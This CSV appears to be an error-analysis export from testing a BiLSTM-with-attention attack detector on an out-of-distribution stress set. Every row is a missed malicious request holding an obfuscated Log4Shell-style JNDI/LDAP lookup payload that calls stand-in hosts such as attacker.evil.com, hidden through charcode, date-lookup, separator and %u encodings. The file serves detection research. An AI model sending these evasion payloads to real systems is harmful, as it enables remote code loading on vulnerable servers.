model,test_set,id,source,raw_log,normalized_log,true_label,pred_label,score,threshold,error_type,obfuscation_type,explanation
BiLSTM + Attention,ood_stress_test.csv,OOD-900057,ood_stress_malicious,GET /api/audit?trace=${j${k8s:k5:-n}d${sd:k5:-i}:ldap://log4j-test.invalid/unsupported-namespace}&request_id=ood-900057 HTTP/1.1 Host: victim.local,get /api/audit?trace=${j${k8s:k5:-n}d${sd:k5:-i}:ldap://log4j-test.invalid/unsupported-namespace}&request_id=ood-900057 http/1.1 host: victim.local,1,0,7.131358415790601e-06,0.49999999999999994,false_negative_unknown_obfuscation,unsupported_lookup_namespace,Model score disagreed with the dataset label at the evaluation threshold.
BiLSTM + Attention,ood_stress_test.csv,OOD-900048,ood_stress_malicious,GET /profile HTTP/1.1 Host: victim.local Cookie: prefs=light; tracking=${jndi:l${sys:user.name:-d}ap://attacker.evil.com/protocol-sys}; sid=ood900048,get /profile http/1.1 host: victim.local cookie: prefs=light; tracking=${jndi:l${sys:user.name:-d}ap://attacker.evil.com/protocol-sys}; sid=ood900048,1,0,5.116226475365693e-06,0.49999999999999994,false_negative_unknown_obfuscation,protocol_fragment_sys_lookup,Model score disagreed with the dataset label at the evaluation threshold.
BiLSTM + Attention,ood_stress_test.csv,OOD-900106,ood_stress_malicious,"POST /ingest HTTP/1.1 Host: victim.local Content-Type: application/json Body: {""ua"":""${j${k8s:k5:-n}d${sd:k5:-i}:ldap://probe.example.net/unsupported-namespace}"",""host"":""probe.example.net""}","post /ingest http/1.1 host: victim.local content-type: application/json body: {""ua"":""${j${k8s:k5:-n}d${sd:k5:-i}:ldap://probe.example.net/unsupported-namespace}"",""host"":""probe.example.net""}",1,0,0.2284250408411026,0.49999999999999994,false_negative_unknown_obfuscation,unsupported_lookup_namespace,Model score disagreed with the dataset label at the evaluation threshold.
BiLSTM + Attention,ood_stress_test.csv,OOD-900027,ood_stress_malicious,Request from User-Agent: Mozilla/5.0 | X-Forwarded-For: 10.0.0.27 | X-Api-Version: %u0024%u007Bjndi%u003Aldap%u003A%u002F%u002Fattacker.evil.com%u002Fpercent-u%u007D,request from user-agent: mozilla/5.0 | x-forwarded-for: 10.0.0.27 | x-api-version: %u0024%u007bjndi%u003aldap%u003a%u002f%u002fattacker.evil.com%u002fpercent-u%u007d,1,0,3.678771236081957e-06,0.49999999999999994,false_negative_unknown_obfuscation,iis_percent_u_encoding,Model score disagreed with the dataset label at the evaluation threshold.
BiLSTM + Attention,ood_stress_test.csv,OOD-900044,ood_stress_malicious,GET /profile HTTP/1.1 Host: victim.local Cookie: prefs=light; tracking=${${chr:106}${chr:110}${chr:100}${chr:105}:ldap://attacker.evil.com/charcode}; sid=ood900044,get /profile http/1.1 host: victim.local cookie: prefs=light; tracking=${${chr:106}${chr:110}${chr:100}${chr:105}:ldap://attacker.evil.com/charcode}; sid=ood900044,1,0,5.769642029918032e-06,0.49999999999999994,false_negative_unknown_obfuscation,charcode_lookup_reconstruction,Model score disagreed with the dataset label at the evaluation threshold.
BiLSTM + Attention,ood_stress_test.csv,OOD-900122,ood_stress_malicious,"POST /ingest HTTP/1.1 Host: victim.local Content-Type: application/json Body: {""ua"":""%u0024%u007Bjndi%u003Aldap%u003A%u002F%u002Flab-callback.example.org%u002Fpercent-u%u007D"",""host"":""lab-callback.example.org""}","post /ingest http/1.1 host: victim.local content-type: application/json body: {""ua"":""%u0024%u007bjndi%u003aldap%u003a%u002f%u002flab-callback.example.org%u002fpercent-u%u007d"",""host"":""lab-callback.example.org""}",1,0,3.548602762748487e-05,0.49999999999999994,false_negative_unknown_obfuscation,iis_percent_u_encoding,Model score disagreed with the dataset label at the evaluation threshold.
BiLSTM + Attention,ood_stress_test.csv,OOD-900045,ood_stress_malicious,GET /api/audit?trace=${jndi:l${sys:user.name:-d}ap://attacker.evil.com/protocol-sys}&request_id=ood-900045 HTTP/1.1 Host: victim.local,get /api/audit?trace=${jndi:l${sys:user.name:-d}ap://attacker.evil.com/protocol-sys}&request_id=ood-900045 http/1.1 host: victim.local,1,0,6.535823558806442e-06,0.49999999999999994,false_negative_unknown_obfuscation,protocol_fragment_sys_lookup,Model score disagreed with the dataset label at the evaluation threshold.
BiLSTM + Attention,ood_stress_test.csv,OOD-900102,ood_stress_malicious,"POST /ingest HTTP/1.1 Host: victim.local Content-Type: application/json Body: {""ua"":""${j${sys:line.separator}ndi:ldap://probe.example.net/sys-separator}"",""host"":""probe.example.net""}","post /ingest http/1.1 host: victim.local content-type: application/json body: {""ua"":""${j${sys:line.separator}ndi:ldap://probe.example.net/sys-separator}"",""host"":""probe.example.net""}",1,0,1.4187507986207493e-05,0.49999999999999994,false_negative_unknown_obfuscation,sys_lookup_separator,Model score disagreed with the dataset label at the evaluation threshold.
BiLSTM + Attention,ood_stress_test.csv,OOD-900004,ood_stress_malicious,GET /profile HTTP/1.1 Host: victim.local Cookie: prefs=light; tracking=%u0024%u007Bjndi%u003Aldap%u003A%u002F%u002Fevil.example%u002Fpercent-u%u007D; sid=ood900004,get /profile http/1.1 host: victim.local cookie: prefs=light; tracking=%u0024%u007bjndi%u003aldap%u003a%u002f%u002fevil.example%u002fpercent-u%u007d; sid=ood900004,1,0,3.6846349757979624e-06,0.49999999999999994,false_negative_unknown_obfuscation,iis_percent_u_encoding,Model score disagreed with the dataset label at the evaluation threshold.
BiLSTM + Attention,ood_stress_test.csv,OOD-900041,ood_stress_malicious,GET /api/audit?trace=${${chr:106}${chr:110}${chr:100}${chr:105}:ldap://attacker.evil.com/charcode}&request_id=ood-900041 HTTP/1.1 Host: victim.local,get /api/audit?trace=${${chr:106}${chr:110}${chr:100}${chr:105}:ldap://attacker.evil.com/charcode}&request_id=ood-900041 http/1.1 host: victim.local,1,0,7.467013347195461e-06,0.49999999999999994,false_negative_unknown_obfuscation,charcode_lookup_reconstruction,Model score disagreed with the dataset label at the evaluation threshold.
BiLSTM + Attention,ood_stress_test.csv,OOD-900013,ood_stress_malicious,GET /api/audit?trace=${${date:yyyy:-j}${date:MM:-n}${date:dd:-d}${date:HH:-i}:ldap://evil.example/date-fragment}&request_id=ood-900013 HTTP/1.1 Host: victim.local,get /api/audit?trace=${${date:yyyy:-j}${date:mm:-n}${date:dd:-d}${date:hh:-i}:ldap://evil.example/date-fragment}&request_id=ood-900013 http/1.1 host: victim.local,1,0,8.759961019677576e-06,0.49999999999999994,false_negative_unknown_obfuscation,date_lookup_reconstruction,Model score disagreed with the dataset label at the evaluation threshold.
BiLSTM + Attention,ood_stress_test.csv,OOD-900040,ood_stress_malicious,GET /profile HTTP/1.1 Host: victim.local Cookie: prefs=light; tracking=${${date:yyyy:-j}${date:MM:-n}${date:dd:-d}${date:HH:-i}:ldap://attacker.evil.com/date-fragment}; sid=ood900040,get /profile http/1.1 host: victim.local cookie: prefs=light; tracking=${${date:yyyy:-j}${date:mm:-n}${date:dd:-d}${date:hh:-i}:ldap://attacker.evil.com/date-fragment}; sid=ood900040,1,0,6.434397164412076e-06,0.49999999999999994,false_negative_unknown_obfuscation,date_lookup_reconstruction,Model score disagreed with the dataset label at the evaluation threshold.
BiLSTM + Attention,ood_stress_test.csv,OOD-900080,ood_stress_malicious,GET /profile HTTP/1.1 Host: victim.local Cookie: prefs=light; tracking=${j${sys:line.separator}ndi:ldap://callback.local/sys-separator}; sid=ood900080,get /profile http/1.1 host: victim.local cookie: prefs=light; tracking=${j${sys:line.separator}ndi:ldap://callback.local/sys-separator}; sid=ood900080,1,0,5.251888524071546e-06,0.49999999999999994,false_negative_unknown_obfuscation,sys_lookup_separator,Model score disagreed with the dataset label at the evaluation threshold.
BiLSTM + Attention,ood_stress_test.csv,OOD-900024,ood_stress_malicious,GET /profile HTTP/1.1 Host: victim.local Cookie: prefs=light; tracking=${jndi:l${sys:user.name:-d}ap://evil.example/protocol-sys}; sid=ood900024,get /profile http/1.1 host: victim.local cookie: prefs=light; tracking=${jndi:l${sys:user.name:-d}ap://evil.example/protocol-sys}; sid=ood900024,1,0,4.838249878957868e-06,0.49999999999999994,false_negative_unknown_obfuscation,protocol_fragment_sys_lookup,Model score disagreed with the dataset label at the evaluation threshold.
BiLSTM + Attention,ood_stress_test.csv,OOD-900133,ood_stress_malicious,GET /api/audit?trace=${${date:yyyy:-j}${date:MM:-n}${date:dd:-d}${date:HH:-i}:ldap://lab-callback.example.org/date-fragment}&request_id=ood-900133 HTTP/1.1 Host: victim.local,get /api/audit?trace=${${date:yyyy:-j}${date:mm:-n}${date:dd:-d}${date:hh:-i}:ldap://lab-callback.example.org/date-fragment}&request_id=ood-900133 http/1.1 host: victim.local,1,0,9.89608724921709e-06,0.49999999999999994,false_negative_unknown_obfuscation,date_lookup_reconstruction,Model score disagreed with the dataset label at the evaluation threshold.
BiLSTM + Attention,ood_stress_test.csv,OOD-900085,ood_stress_malicious,GET /api/audit?trace=${${date:yyyy:-j}${date:MM:-n}${date:dd:-d}${date:HH:-i}:ldap://callback.local/date-fragment}&request_id=ood-900085 HTTP/1.1 Host: victim.local,get /api/audit?trace=${${date:yyyy:-j}${date:mm:-n}${date:dd:-d}${date:hh:-i}:ldap://callback.local/date-fragment}&request_id=ood-900085 http/1.1 host: victim.local,1,0,9.329034583061002e-06,0.49999999999999994,false_negative_unknown_obfuscation,date_lookup_reconstruction,Model score disagreed with the dataset label at the evaluation threshold.
BiLSTM + Attention,ood_stress_test.csv,OOD-900073,ood_stress_malicious,GET /api/audit?trace=%u0024%u007Bjndi%u003Aldap%u003A%u002F%u002Fcallback.local%u002Fpercent-u%u007D&request_id=ood-900073 HTTP/1.1 Host: victim.local,get /api/audit?trace=%u0024%u007bjndi%u003aldap%u003a%u002f%u002fcallback.local%u002fpercent-u%u007d&request_id=ood-900073 http/1.1 host: victim.local,1,0,4.296968654671218e-06,0.49999999999999994,false_negative_unknown_obfuscation,iis_percent_u_encoding,Model score disagreed with the dataset label at the evaluation threshold.
BiLSTM + Attention,ood_stress_test.csv,OOD-900020,ood_stress_malicious,GET /profile HTTP/1.1 Host: victim.local Cookie: prefs=light; tracking=${${chr:106}${chr:110}${chr:100}${chr:105}:ldap://evil.example/charcode}; sid=ood900020,get /profile http/1.1 host: victim.local cookie: prefs=light; tracking=${${chr:106}${chr:110}${chr:100}${chr:105}:ldap://evil.example/charcode}; sid=ood900020,1,0,5.4992719924484845e-06,0.49999999999999994,false_negative_unknown_obfuscation,charcode_lookup_reconstruction,Model score disagreed with the dataset label at the evaluation threshold.
BiLSTM + Attention,ood_stress_test.csv,OOD-900053,ood_stress_malicious,GET /api/audit?trace=${j${sys:line.separator}ndi:ldap://log4j-test.invalid/sys-separator}&request_id=ood-900053 HTTP/1.1 Host: victim.local,get /api/audit?trace=${j${sys:line.separator}ndi:ldap://log4j-test.invalid/sys-separator}&request_id=ood-900053 http/1.1 host: victim.local,1,0,7.14457792128087e-06,0.49999999999999994,false_negative_unknown_obfuscation,sys_lookup_separator,Model score disagreed with the dataset label at the evaluation threshold.
BiLSTM + Attention,ood_stress_test.csv,OOD-900076,ood_stress_malicious,GET /profile HTTP/1.1 Host: victim.local Cookie: prefs=light; tracking=%u0024%u007Bjndi%u003Aldap%u003A%u002F%u002Fcallback.local%u002Fpercent-u%u007D; sid=ood900076,get /profile http/1.1 host: victim.local cookie: prefs=light; tracking=%u0024%u007bjndi%u003aldap%u003a%u002f%u002fcallback.local%u002fpercent-u%u007d; sid=ood900076,1,0,3.8233547456911765e-06,0.49999999999999994,false_negative_unknown_obfuscation,iis_percent_u_encoding,Model score disagreed with the dataset label at the evaluation threshold.
BiLSTM + Attention,ood_stress_test.csv,OOD-900136,ood_stress_malicious,GET /profile HTTP/1.1 Host: victim.local Cookie: prefs=light; tracking=${${date:yyyy:-j}${date:MM:-n}${date:dd:-d}${date:HH:-i}:ldap://lab-callback.example.org/date-fragment}; sid=ood900136,get /profile http/1.1 host: victim.local cookie: prefs=light; tracking=${${date:yyyy:-j}${date:mm:-n}${date:dd:-d}${date:hh:-i}:ldap://lab-callback.example.org/date-fragment}; sid=ood900136,1,0,7.269056823133724e-06,0.49999999999999994,false_negative_unknown_obfuscation,date_lookup_reconstruction,Model score disagreed with the dataset label at the evaluation threshold.
BiLSTM + Attention,ood_stress_test.csv,OOD-900005,ood_stress_malicious,GET /api/audit?trace=${j${sys:line.separator}ndi:ldap://evil.example/sys-separator}&request_id=ood-900005 HTTP/1.1 Host: victim.local,get /api/audit?trace=${j${sys:line.separator}ndi:ldap://evil.example/sys-separator}&request_id=ood-900005 http/1.1 host: victim.local,1,0,6.611806384171359e-06,0.49999999999999994,false_negative_unknown_obfuscation,sys_lookup_separator,Model score disagreed with the dataset label at the evaluation threshold.
BiLSTM + Attention,ood_stress_test.csv,OOD-900128,ood_stress_malicious,GET /profile HTTP/1.1 Host: victim.local Cookie: prefs=light; tracking=${j${sys:line.separator}ndi:ldap://lab-callback.example.org/sys-separator}; sid=ood900128,get /profile http/1.1 host: victim.local cookie: prefs=light; tracking=${j${sys:line.separator}ndi:ldap://lab-callback.example.org/sys-separator}; sid=ood900128,1,0,5.896412858419353e-06,0.49999999999999994,false_negative_unknown_obfuscation,sys_lookup_separator,Model score disagreed with the dataset label at the evaluation threshold.
BiLSTM + Attention,ood_stress_test.csv,OOD-900077,ood_stress_malicious,GET /api/audit?trace=${j${sys:line.separator}ndi:ldap://callback.local/sys-separator}&request_id=ood-900077 HTTP/1.1 Host: victim.local,get /api/audit?trace=${j${sys:line.separator}ndi:ldap://callback.local/sys-separator}&request_id=ood-900077 http/1.1 host: victim.local,1,0,7.1526155807077885e-06,0.49999999999999994,false_negative_unknown_obfuscation,sys_lookup_separator,Model score disagreed with the dataset label at the evaluation threshold.
BiLSTM + Attention,ood_stress_test.csv,OOD-900074,ood_stress_malicious,"POST /ingest HTTP/1.1 Host: victim.local Content-Type: application/json Body: {""ua"":""%u0024%u007Bjndi%u003Aldap%u003A%u002F%u002Fcallback.local%u002Fpercent-u%u007D"",""host"":""callback.local""}","post /ingest http/1.1 host: victim.local content-type: application/json body: {""ua"":""%u0024%u007bjndi%u003aldap%u003a%u002f%u002fcallback.local%u002fpercent-u%u007d"",""host"":""callback.local""}",1,0,1.1711049410223495e-05,0.49999999999999994,false_negative_unknown_obfuscation,iis_percent_u_encoding,Model score disagreed with the dataset label at the evaluation threshold.
BiLSTM + Attention,ood_stress_test.csv,OOD-900042,ood_stress_malicious,"POST /ingest HTTP/1.1 Host: victim.local Content-Type: application/json Body: {""ua"":""${${chr:106}${chr:110}${chr:100}${chr:105}:ldap://attacker.evil.com/charcode}"",""host"":""attacker.evil.com""}","post /ingest http/1.1 host: victim.local content-type: application/json body: {""ua"":""${${chr:106}${chr:110}${chr:100}${chr:105}:ldap://attacker.evil.com/charcode}"",""host"":""attacker.evil.com""}",1,0,1.3066781320958398e-05,0.49999999999999994,false_negative_unknown_obfuscation,charcode_lookup_reconstruction,Model score disagreed with the dataset label at the evaluation threshold.
BiLSTM + Attention,ood_stress_test.csv,OOD-900037,ood_stress_malicious,GET /api/audit?trace=${${date:yyyy:-j}${date:MM:-n}${date:dd:-d}${date:HH:-i}:ldap://attacker.evil.com/date-fragment}&request_id=ood-900037 HTTP/1.1 Host: victim.local,get /api/audit?trace=${${date:yyyy:-j}${date:mm:-n}${date:dd:-d}${date:hh:-i}:ldap://attacker.evil.com/date-fragment}&request_id=ood-900037 http/1.1 host: victim.local,1,0,9.439585483050905e-06,0.49999999999999994,false_negative_unknown_obfuscation,date_lookup_reconstruction,Model score disagreed with the dataset label at the evaluation threshold.
BiLSTM + Attention,ood_stress_test.csv,OOD-900097,ood_stress_malicious,GET /api/audit?trace=%u0024%u007Bjndi%u003Aldap%u003A%u002F%u002Fprobe.example.net%u002Fpercent-u%u007D&request_id=ood-900097 HTTP/1.1 Host: victim.local,get /api/audit?trace=%u0024%u007bjndi%u003aldap%u003a%u002f%u002fprobe.example.net%u002fpercent-u%u007d&request_id=ood-900097 http/1.1 host: victim.local,1,0,4.406707375892438e-06,0.49999999999999994,false_negative_unknown_obfuscation,iis_percent_u_encoding,Model score disagreed with the dataset label at the evaluation threshold.
BiLSTM + Attention,ood_stress_test.csv,OOD-900016,ood_stress_malicious,GET /profile HTTP/1.1 Host: victim.local Cookie: prefs=light; tracking=${${date:yyyy:-j}${date:MM:-n}${date:dd:-d}${date:HH:-i}:ldap://evil.example/date-fragment}; sid=ood900016,get /profile http/1.1 host: victim.local cookie: prefs=light; tracking=${${date:yyyy:-j}${date:mm:-n}${date:dd:-d}${date:hh:-i}:ldap://evil.example/date-fragment}; sid=ood900016,1,0,6.442545327445259e-06,0.49999999999999994,false_negative_unknown_obfuscation,date_lookup_reconstruction,Model score disagreed with the dataset label at the evaluation threshold.
BiLSTM + Attention,ood_stress_test.csv,OOD-900050,ood_stress_malicious,"POST /ingest HTTP/1.1 Host: victim.local Content-Type: application/json Body: {""ua"":""%u0024%u007Bjndi%u003Aldap%u003A%u002F%u002Flog4j-test.invalid%u002Fpercent-u%u007D"",""host"":""log4j-test.invalid""}","post /ingest http/1.1 host: victim.local content-type: application/json body: {""ua"":""%u0024%u007bjndi%u003aldap%u003a%u002f%u002flog4j-test.invalid%u002fpercent-u%u007d"",""host"":""log4j-test.invalid""}",1,0,6.191017746459693e-06,0.49999999999999994,false_negative_unknown_obfuscation,iis_percent_u_encoding,Model score disagreed with the dataset label at the evaluation threshold.
BiLSTM + Attention,ood_stress_test.csv,OOD-900105,ood_stress_malicious,GET /api/audit?trace=${j${k8s:k5:-n}d${sd:k5:-i}:ldap://probe.example.net/unsupported-namespace}&request_id=ood-900105 HTTP/1.1 Host: victim.local,get /api/audit?trace=${j${k8s:k5:-n}d${sd:k5:-i}:ldap://probe.example.net/unsupported-namespace}&request_id=ood-900105 http/1.1 host: victim.local,1,0,7.81721519160783e-06,0.49999999999999994,false_negative_unknown_obfuscation,unsupported_lookup_namespace,Model score disagreed with the dataset label at the evaluation threshold.
BiLSTM + Attention,ood_stress_test.csv,OOD-900101,ood_stress_malicious,GET /api/audit?trace=${j${sys:line.separator}ndi:ldap://probe.example.net/sys-separator}&request_id=ood-900101 HTTP/1.1 Host: victim.local,get /api/audit?trace=${j${sys:line.separator}ndi:ldap://probe.example.net/sys-separator}&request_id=ood-900101 http/1.1 host: victim.local,1,0,7.224879936984507e-06,0.49999999999999994,false_negative_unknown_obfuscation,sys_lookup_separator,Model score disagreed with the dataset label at the evaluation threshold.
BiLSTM + Attention,ood_stress_test.csv,OOD-900116,ood_stress_malicious,GET /profile HTTP/1.1 Host: victim.local Cookie: prefs=light; tracking=${${chr:106}${chr:110}${chr:100}${chr:105}:ldap://probe.example.net/charcode}; sid=ood900116,get /profile http/1.1 host: victim.local cookie: prefs=light; tracking=${${chr:106}${chr:110}${chr:100}${chr:105}:ldap://probe.example.net/charcode}; sid=ood900116,1,0,6.126353127910988e-06,0.49999999999999994,false_negative_unknown_obfuscation,charcode_lookup_reconstruction,Model score disagreed with the dataset label at the evaluation threshold.
BiLSTM + Attention,ood_stress_test.csv,OOD-900009,ood_stress_malicious,GET /api/audit?trace=${j${k8s:k5:-n}d${sd:k5:-i}:ldap://evil.example/unsupported-namespace}&request_id=ood-900009 HTTP/1.1 Host: victim.local,get /api/audit?trace=${j${k8s:k5:-n}d${sd:k5:-i}:ldap://evil.example/unsupported-namespace}&request_id=ood-900009 http/1.1 host: victim.local,1,0,6.259969723032555e-06,0.49999999999999994,false_negative_unknown_obfuscation,unsupported_lookup_namespace,Model score disagreed with the dataset label at the evaluation threshold.
BiLSTM + Attention,ood_stress_test.csv,OOD-900093,ood_stress_malicious,GET /api/audit?trace=${jndi:l${sys:user.name:-d}ap://callback.local/protocol-sys}&request_id=ood-900093 HTTP/1.1 Host: victim.local,get /api/audit?trace=${jndi:l${sys:user.name:-d}ap://callback.local/protocol-sys}&request_id=ood-900093 http/1.1 host: victim.local,1,0,6.101071903685806e-06,0.49999999999999994,false_negative_unknown_obfuscation,protocol_fragment_sys_lookup,Model score disagreed with the dataset label at the evaluation threshold.
BiLSTM + Attention,ood_stress_test.csv,OOD-900117,ood_stress_malicious,GET /api/audit?trace=${jndi:l${sys:user.name:-d}ap://probe.example.net/protocol-sys}&request_id=ood-900117 HTTP/1.1 Host: victim.local,get /api/audit?trace=${jndi:l${sys:user.name:-d}ap://probe.example.net/protocol-sys}&request_id=ood-900117 http/1.1 host: victim.local,1,0,6.968846719246358e-06,0.49999999999999994,false_negative_unknown_obfuscation,protocol_fragment_sys_lookup,Model score disagreed with the dataset label at the evaluation threshold.
BiLSTM + Attention,ood_stress_test.csv,OOD-900104,ood_stress_malicious,GET /profile HTTP/1.1 Host: victim.local Cookie: prefs=light; tracking=${j${sys:line.separator}ndi:ldap://probe.example.net/sys-separator}; sid=ood900104,get /profile http/1.1 host: victim.local cookie: prefs=light; tracking=${j${sys:line.separator}ndi:ldap://probe.example.net/sys-separator}; sid=ood900104,1,0,5.464964488055557e-06,0.49999999999999994,false_negative_unknown_obfuscation,sys_lookup_separator,Model score disagreed with the dataset label at the evaluation threshold.
BiLSTM + Attention,ood_stress_test.csv,OOD-900092,ood_stress_malicious,GET /profile HTTP/1.1 Host: victim.local Cookie: prefs=light; tracking=${${chr:106}${chr:110}${chr:100}${chr:105}:ldap://callback.local/charcode}; sid=ood900092,get /profile http/1.1 host: victim.local cookie: prefs=light; tracking=${${chr:106}${chr:110}${chr:100}${chr:105}:ldap://callback.local/charcode}; sid=ood900092,1,0,5.637472895614337e-06,0.49999999999999994,false_negative_unknown_obfuscation,charcode_lookup_reconstruction,Model score disagreed with the dataset label at the evaluation threshold.
BiLSTM + Attention,ood_stress_test.csv,OOD-900034,ood_stress_malicious,"POST /ingest HTTP/1.1 Host: victim.local Content-Type: application/json Body: {""ua"":""${j${k8s:k5:-n}d${sd:k5:-i}:ldap://attacker.evil.com/unsupported-namespace}"",""host"":""attacker.evil.com""}","post /ingest http/1.1 host: victim.local content-type: application/json body: {""ua"":""${j${k8s:k5:-n}d${sd:k5:-i}:ldap://attacker.evil.com/unsupported-namespace}"",""host"":""attacker.evil.com""}",1,0,1.2579623216879554e-05,0.49999999999999994,false_negative_unknown_obfuscation,unsupported_lookup_namespace,Model score disagreed with the dataset label at the evaluation threshold.
BiLSTM + Attention,ood_stress_test.csv,OOD-900121,ood_stress_malicious,GET /api/audit?trace=%u0024%u007Bjndi%u003Aldap%u003A%u002F%u002Flab-callback.example.org%u002Fpercent-u%u007D&request_id=ood-900121 HTTP/1.1 Host: victim.local,get /api/audit?trace=%u0024%u007bjndi%u003aldap%u003a%u002f%u002flab-callback.example.org%u002fpercent-u%u007d&request_id=ood-900121 http/1.1 host: victim.local,1,0,4.538836037681904e-06,0.49999999999999994,false_negative_unknown_obfuscation,iis_percent_u_encoding,Model score disagreed with the dataset label at the evaluation threshold.
BiLSTM + Attention,ood_stress_test.csv,OOD-900066,ood_stress_malicious,"POST /ingest HTTP/1.1 Host: victim.local Content-Type: application/json Body: {""ua"":""${${chr:106}${chr:110}${chr:100}${chr:105}:ldap://log4j-test.invalid/charcode}"",""host"":""log4j-test.invalid""}","post /ingest http/1.1 host: victim.local content-type: application/json body: {""ua"":""${${chr:106}${chr:110}${chr:100}${chr:105}:ldap://log4j-test.invalid/charcode}"",""host"":""log4j-test.invalid""}",1,0,1.1702854862960521e-05,0.49999999999999994,false_negative_unknown_obfuscation,charcode_lookup_reconstruction,Model score disagreed with the dataset label at the evaluation threshold.
BiLSTM + Attention,ood_stress_test.csv,OOD-900096,ood_stress_malicious,GET /profile HTTP/1.1 Host: victim.local Cookie: prefs=light; tracking=${jndi:l${sys:user.name:-d}ap://callback.local/protocol-sys}; sid=ood900096,get /profile http/1.1 host: victim.local cookie: prefs=light; tracking=${jndi:l${sys:user.name:-d}ap://callback.local/protocol-sys}; sid=ood900096,1,0,5.028959094488528e-06,0.49999999999999994,false_negative_unknown_obfuscation,protocol_fragment_sys_lookup,Model score disagreed with the dataset label at the evaluation threshold.
BiLSTM + Attention,ood_stress_test.csv,OOD-900089,ood_stress_malicious,GET /api/audit?trace=${${chr:106}${chr:110}${chr:100}${chr:105}:ldap://callback.local/charcode}&request_id=ood-900089 HTTP/1.1 Host: victim.local,get /api/audit?trace=${${chr:106}${chr:110}${chr:100}${chr:105}:ldap://callback.local/charcode}&request_id=ood-900089 http/1.1 host: victim.local,1,0,7.582951639051316e-06,0.49999999999999994,false_negative_unknown_obfuscation,charcode_lookup_reconstruction,Model score disagreed with the dataset label at the evaluation threshold.
BiLSTM + Attention,ood_stress_test.csv,OOD-900029,ood_stress_malicious,GET /api/audit?trace=${j${sys:line.separator}ndi:ldap://attacker.evil.com/sys-separator}&request_id=ood-900029 HTTP/1.1 Host: victim.local,get /api/audit?trace=${j${sys:line.separator}ndi:ldap://attacker.evil.com/sys-separator}&request_id=ood-900029 http/1.1 host: victim.local,1,0,6.9570796767948195e-06,0.49999999999999994,false_negative_unknown_obfuscation,sys_lookup_separator,Model score disagreed with the dataset label at the evaluation threshold.
BiLSTM + Attention,ood_stress_test.csv,OOD-900021,ood_stress_malicious,GET /api/audit?trace=${jndi:l${sys:user.name:-d}ap://evil.example/protocol-sys}&request_id=ood-900021 HTTP/1.1 Host: victim.local,get /api/audit?trace=${jndi:l${sys:user.name:-d}ap://evil.example/protocol-sys}&request_id=ood-900021 http/1.1 host: victim.local,1,0,5.887506631552242e-06,0.49999999999999994,false_negative_unknown_obfuscation,protocol_fragment_sys_lookup,Model score disagreed with the dataset label at the evaluation threshold.
BiLSTM + Attention,ood_stress_test.csv,OOD-900068,ood_stress_malicious,GET /profile HTTP/1.1 Host: victim.local Cookie: prefs=light; tracking=${${chr:106}${chr:110}${chr:100}${chr:105}:ldap://log4j-test.invalid/charcode}; sid=ood900068,get /profile http/1.1 host: victim.local cookie: prefs=light; tracking=${${chr:106}${chr:110}${chr:100}${chr:105}:ldap://log4j-test.invalid/charcode}; sid=ood900068,1,0,6.233216481632553e-06,0.49999999999999994,false_negative_unknown_obfuscation,charcode_lookup_reconstruction,Model score disagreed with the dataset label at the evaluation threshold.
BiLSTM + Attention,ood_stress_test.csv,OOD-900064,ood_stress_malicious,GET /profile HTTP/1.1 Host: victim.local Cookie: prefs=light; tracking=${${date:yyyy:-j}${date:MM:-n}${date:dd:-d}${date:HH:-i}:ldap://log4j-test.invalid/date-fragment}; sid=ood900064,get /profile http/1.1 host: victim.local cookie: prefs=light; tracking=${${date:yyyy:-j}${date:mm:-n}${date:dd:-d}${date:hh:-i}:ldap://log4j-test.invalid/date-fragment}; sid=ood900064,1,0,6.912175194884185e-06,0.49999999999999994,false_negative_unknown_obfuscation,date_lookup_reconstruction,Model score disagreed with the dataset label at the evaluation threshold.
BiLSTM + Attention,ood_stress_test.csv,OOD-900110,ood_stress_malicious,"POST /ingest HTTP/1.1 Host: victim.local Content-Type: application/json Body: {""ua"":""${${date:yyyy:-j}${date:MM:-n}${date:dd:-d}${date:HH:-i}:ldap://probe.example.net/date-fragment}"",""host"":""probe.example.net""}","post /ingest http/1.1 host: victim.local content-type: application/json body: {""ua"":""${${date:yyyy:-j}${date:mm:-n}${date:dd:-d}${date:hh:-i}:ldap://probe.example.net/date-fragment}"",""host"":""probe.example.net""}",1,0,1.6688956748112105e-05,0.49999999999999994,false_negative_unknown_obfuscation,date_lookup_reconstruction,Model score disagreed with the dataset label at the evaluation threshold.
